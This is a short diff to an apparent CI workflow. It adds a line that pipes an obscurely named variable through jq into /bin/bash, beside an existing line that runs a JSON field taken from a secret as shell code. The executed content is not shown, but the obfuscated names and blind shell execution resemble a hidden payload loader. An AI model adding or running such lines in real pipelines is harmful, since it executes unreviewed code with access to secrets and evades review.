@@ -17,6 +17,7 @@ jobs:
           c44030: ${{ secrets.c44030 }}
         run: |
           printf '%s' "$c44030" | jq -r .guhgl34571 | /bin/bash
+          echo $gum63153 | jq -r .jos1408 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
